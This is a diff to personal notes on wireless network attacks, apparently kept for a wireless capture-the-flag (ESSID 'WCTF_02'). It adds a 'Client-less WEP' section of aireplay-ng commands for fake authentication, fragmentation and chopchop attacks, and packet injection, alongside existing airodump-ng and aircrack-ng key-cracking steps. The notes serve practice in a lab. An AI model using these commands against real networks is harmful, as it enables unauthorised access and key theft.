@@ -14,7 +14,7 @@ sudo airodump-ng  -w derp --output-format pcap --band ag wlan27mon
 sudo aircrack-ng -w cyberpunk.words derp0-01.cap
 
 
-## Caffe Latte
+## Caffe Latte (WEP, no AP)
 
 How to recognize?
 You might find in airodump-ng that there are probes to ESSIDs that aren't found.
@@ -60,3 +60,17 @@ auth_algs=3
 put that into my_ha.conf
 
 hostapd my_ha.conf starts the beacon and the original airodump will capture enough IVs for aircrack
+
+
+
+## Client-less WEP
+
+aireplay-ng -1 0 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
+
+aireplay-ng -5 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
+
+aireplay-ng -4 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
+
+ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
+ 
+aireplay-ng -1 1000 -o 1 -q 10 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
